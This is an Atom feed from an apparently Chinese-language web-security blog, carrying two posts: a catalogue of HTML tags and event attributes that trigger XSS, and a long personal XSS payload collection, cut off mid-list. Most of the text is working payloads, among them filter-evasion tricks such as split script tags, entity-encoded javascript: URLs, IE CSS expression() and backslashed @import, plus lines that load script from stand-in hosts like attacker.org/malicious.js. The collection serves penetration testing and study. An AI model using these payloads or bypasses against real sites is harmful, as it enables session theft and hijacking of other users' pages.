<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Mi1k7ea.github.com/"/>
  <updated>2019-02-19T16:07:02.874Z</updated>
  <id>https://Mi1k7ea.github.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些加载XSS Payload的标签</title>
    <link href="https://Mi1k7ea.github.com/2019/02/19/%E4%B8%80%E4%BA%9B%E5%8A%A0%E8%BD%BDXSS-Payload%E7%9A%84%E6%A0%87%E7%AD%BE/"/>
    <id>https://Mi1k7ea.github.com/2019/02/19/一些加载XSS-Payload的标签/</id>
    <published>2019-02-19T14:54:12.000Z</published>
    <updated>2019-02-19T16:07:02.874Z</updated>
    
    <content type="html"><![CDATA[<p>一些可以加载XSS Payload的标签，慢慢整理下来吧。</p><h2 id="Script标签"><a href="#Script标签" class="headerlink" title="Script标签"></a>Script标签</h2><p>这个标签不用多说。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://a.com/evil.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Img标签"><a href="#Img标签" class="headerlink" title="Img标签"></a>Img标签</h2><p>通常是触发onerror事件来执行js代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Body标签"><a href="#Body标签" class="headerlink" title="Body标签"></a>Body标签</h2><p>主要可利用onload、onpageshow等事件属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Svg标签"><a href="#Svg标签" class="headerlink" title="Svg标签"></a>Svg标签</h2><p>svg标签可以和onload组合进行利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Style标签"><a href="#Style标签" class="headerlink" title="Style标签"></a>Style标签</h2><p>style标签可以和onload组合进行利用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">onload</span>=<span class="string">alert(1)</span> /&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><h2 id="Marquee标签"><a href="#Marquee标签" class="headerlink" title="Marquee标签"></a>Marquee标签</h2><p>Marquee 标签除了在web开发中有标签内容回滚作用之外，它还支持一系列的事件处理程序，因此可以用它来实现XSS Payload触发。Marquee支持的一系列事件处理程序如下：</p><p>onbounce事件：是在marquee标签中的内容滚动到上下或左右边界时触发的事件处理程序，该事件只有在marquee标签的behavior属性设为alternate时才有效；</p><p>onfinish事件：当 marquee 完成 loop 属性设置的值时触发。它只能在 loop 属性设置为大于 0 的某个数字时触发；</p><p>onstart事件: 当 marquee 标签内容开始滚动时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">"alternate"</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">"1"</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Media标签"><a href="#Media标签" class="headerlink" title="Media标签"></a>Media标签</h2><p>audio标签和video标签的以下属性可用于触发payload。</p><p>oncanplay: 在用户可以开始播放音视频（audio/video）时触发；</p><p>ondurationchange: 在音视频（audio/video）的时长发生变化时触发；</p><p>onended: 在音视频（audio/video）播放结束时触发；</p><p>onloadeddata: 在音视频数据帧加载时触发，也即在当前帧的数据加载完成且还没有足够的数据播放音视频（audio/video）的下一帧时触发；</p><p>onloadedmetadata: 在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发；</p><p>onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</p><p>onprogress: 浏览器下载指定的音视频（audio/video）时触发；</p><p>onsuspend: 在浏览器读取音视频（audio/video）数据中止时触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">oncanplay</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">ondurationchange</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">onended</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadeddata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadstart</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onprogress</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onsuspend</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">oncanplay</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">ondurationchange</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span>=<span class="string">"true"</span> <span class="attr">onended</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadeddata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadstart</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onprogress</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onsuspend</span>=<span class="string">"alert(1)"</span> <span class="attr">src</span>=<span class="string">"test.mp4"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/195507.html" target="_blank" rel="noopener">他山之石 | 对 XSS 的一次深入分析认识</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一些可以加载XSS Payload的标签，慢慢整理下来吧。&lt;/p&gt;
&lt;h2 id=&quot;Script标签&quot;&gt;&lt;a href=&quot;#Script标签&quot; class=&quot;headerlink&quot; title=&quot;Script标签&quot;&gt;&lt;/a&gt;Script标签&lt;/h2&gt;&lt;p&gt;这个标签不用多说。
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>个人XSS payload收集</title>
    <link href="https://Mi1k7ea.github.com/2019/02/16/%E4%B8%AA%E4%BA%BAXSS-payload%E6%94%B6%E9%9B%86/"/>
    <id>https://Mi1k7ea.github.com/2019/02/16/个人XSS-payload收集/</id>
    <published>2019-02-16T07:58:11.000Z</published>
    <updated>2019-02-16T08:17:30.293Z</updated>
    
    <content type="html"><![CDATA[<p>这里为个人网上收集的XSS Payload，仅用于XSS攻击测试。</p><h2 id="《xss绕过，payload全集》"><a href="#《xss绕过，payload全集》" class="headerlink" title="《xss绕过，payload全集》"></a>《xss绕过，payload全集》</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line">通杀标签payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">aaaa</span> <span class="attr">id</span>=<span class="string">"c"</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span> <span class="attr">tabindex</span>=<span class="string">0</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">1、script标签</span><br><span class="line">绕过进行一次移除操作：</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert("XSS")&lt;/scr&lt;script&gt;ipt&gt;</span><br><span class="line">Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://attacker.org/malicious.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.2 JavaScript 事件</span><br><span class="line">我们可以像如下这样在元素中定义 JavaScript 事件：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"alert('xss')"</span>&gt;</span></span><br><span class="line">这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：<span class="tag">&lt;<span class="name">divonmouseenter="alert('xss')"</span>&gt;</span>当用户鼠标移动到 div 上时就会触发我们的代码。</span><br><span class="line">另一个绕过的办法就是在属性和= 之间插入一个空格：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span> =<span class="string">"alert('xss')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.3 行内样式(Inlinestyle)</span><br><span class="line">我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：//IE5之后才支持</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color: expression(alert('XSS'))"</span>&gt;</span>//experssion后执行的语句相当于javascript后执行的语句</span><br><span class="line">过滤器会检查关键字 style，随后跟随的不能是 <span class="tag">&lt;<span class="name">，在随后是</span> <span class="attr">expression</span>：</span></span><br><span class="line">/style=[^&lt;]*((expression\s*?[&lt;]∗?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis</span><br><span class="line">所以，让我们需要把 <span class="tag">&lt; 放到其他地方：</span></span><br><span class="line">&lt;div style="color: '&lt;'; color: expression(alert('XSS'))"&gt;</span><br><span class="line"></span><br><span class="line">1.4 CSS import</span><br><span class="line">IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">@import url("http://attacker.org/malicious.css");</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">malicious.css：</span><br><span class="line">body &#123;</span><br><span class="line">    color: expression(alert('XSS'));</span><br><span class="line">&#125;</span><br><span class="line">为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">@imp\ort url("http://attacker.org/malicious.css");</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">IE 浏览器会接受反斜杠，但是我们绕过了过滤器。</span><br><span class="line">    </span><br><span class="line">1.5 Javascript URL</span><br><span class="line">链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('test')"</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"Java&amp;#115;cript:alert('xss')"</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。</span><br><span class="line">另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'vbscript:MsgBox("XSS")'</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">'-confirm`1`-'</span><br><span class="line">'-confirm(1)-'</span><br><span class="line">    </span><br><span class="line">1.6 利用字符编码</span><br><span class="line">%c1;alert(/xss/);//</span><br><span class="line"></span><br><span class="line">1.7 绕过长度限制</span><br><span class="line">"onclick=alert(1)//</span><br><span class="line">"&gt;<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(xss);<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">1.8 使用<span class="tag">&lt;<span class="name">base</span>&gt;</span>标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">alert(navigator.userAgent)<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(88199)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">confirm(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">+alert(88199)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/88199/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript,alert(88199)</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptsrc=&amp;#100&amp;#97&amp;#116&amp;#97:text</span>/<span class="attr">javascript</span>,<span class="attr">alert</span>(<span class="attr">88199</span>)&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>,<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/88199/</span>.source)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">setTimeout(alert(88199),0)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>[<span class="string">'write'</span>](<span class="number">88199</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">anytag</span> <span class="attr">onmouseover</span>=<span class="string">alert(15)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">anytag</span> <span class="attr">onclick</span>=<span class="string">alert(16)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(17)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(18)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(19)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>/<span class="attr">onclick</span>=<span class="string">alert(20)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span></span></span><br><span class="line"><span class="tag"><span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(21)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>/<span class="attr">action</span>=<span class="string">javascript:alert(22)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span>/<span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(23)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(23)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(24)</span>&gt;</span> 29</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span 